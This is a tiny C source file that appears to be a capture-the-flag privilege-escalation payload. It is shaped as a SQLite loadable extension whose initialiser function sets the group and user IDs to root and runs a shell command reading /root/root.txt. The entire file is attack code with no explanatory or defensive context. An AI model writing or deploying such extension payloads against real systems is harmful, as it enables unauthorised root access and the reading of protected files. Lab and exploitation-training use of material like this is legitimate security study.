#include <stdio.h>
#include <unistd.h>

void sqlite3_m_init(){
setgid(0);
setuid(0);
system("cat /root/root.txt");
}
